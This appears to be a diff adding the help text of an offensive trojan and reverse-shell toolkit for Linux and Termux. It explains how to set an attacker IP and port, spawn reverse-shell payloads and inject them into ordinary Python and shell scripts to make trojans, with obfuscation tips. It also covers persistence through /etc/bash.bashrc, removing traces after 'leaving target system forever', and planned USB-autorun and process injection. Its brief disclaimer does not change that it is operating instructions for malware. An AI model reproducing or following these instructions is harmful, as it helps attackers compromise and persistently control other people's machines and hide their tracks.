@@ -1,0 +1,99 @@
+commands:
+  
+      vset : to set attacker address, exampleL: vset 10.0.0.23  4444 
+                                                     _________  ____
+                                                      IP Addr   Port
+
+      target: Set target system, example: target linux, target termux (Windows payload is not available in this version, check github.com/Mahmoud7Osman/ for updates)
+
+
+
+      spawn: Spawn a payload to connect back to attacker and start the reverse shell, example: spawn  payload.sh
+ 
+
+
+
+      clean: Check if your system is infected with this virus and remove it: example: clean
+
+
+
+      exploit: Start the exploit, example: exploit
+                                                                      Argument 1         Argument 2           Argument 3
+                                                                  __________________  ________________  _______________________
+      ipy: Inject shell payload in a python script, example: ipy  spawned_payload.sh  target_script.py  infected_python_file.py (it is better to obfuscate this file with compileall module in python)
+                                                                  ------------------  ----------------  ------------------------
+                                                                  your shell payload  your normal       the new python script
+                                                                                         python script      (Infected)
+      ish: Inject shell payload in another shell script, example: ish  spawned_payload.sh  target_shell_script.sh   infected_shell_script.sh (the same as 'ipy')
+
+
+
+      cls: Clear screen, example: cls
+
+   
+      
+      help: get help, example: help       
+     
+
+
+      log : manage logs, example: log show, log id 0, log clear
+
+
+
+      zsession: start Z-anaconda Session for file transfer: example: zsession
+
+      
+      mode    : Set Mode for payloads, example: mode root, 
+    
+   
+      banner :  Show banner
+ 
+
+      exit: exit vcs, example: exit
+                                                                                Trojan     Name
+                                                                               _________  ________
+      trojan : Save a file as a trojan in Trojans directory, example:  trojan  trojan.sh  saved.sh
+                                                                               ---------  --------
+                                                                                Arg 1      Arg 2
+
+      payload: Like Trojan command, example: payload pay.py myfile.py
+
+
+tips:
+      - prepare target system with 'target' command, then set the address with 'vset' command, then spawn a payload with 'vcs-spawn' command. 
+     
+      - you can inject your payload in a python script with 'ipy', and in a shell script with 'ish' (you can obfuscate the malicious python script with 'compileall' lib)
+
+      - the payload execution will be injected at '/etc/bash.bashrc' and the data at '/etc/system.cfg', to remove payload from your system type: clean. in the VSS console 
+
+      - Do not use it for illegal purposes
+      
+      - Support exploiting android (termux) and all linux os, this tool run in termux and linux
+
+      - see modes/ for available mode for OS's
+Next version:
+  
+      - Machine code injection will be supported
+   
+      - Process injection will be supported
+
+      - Automatic Proccess checker will be available
+
+      - Injecting Hard Drives will be available
+
+      - Injecting USB with autorun for windows will be available
+
+
+Warning:
+
+     - Before leaving the session check processes with 'ps aux | grep .cfg' and kill running viruses.  
+
+     - When you want to leave target system forever delete this files:
+                    /etc/system.cfg
+                    /var/sys.cfg*
+
+     - Optionaly: You need to edit the /etc/bash.bashrc and remove the line that execute the payload (Reduce noises)
+
+
+     - This tool is dangerous, please do not use it with illegal actions
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
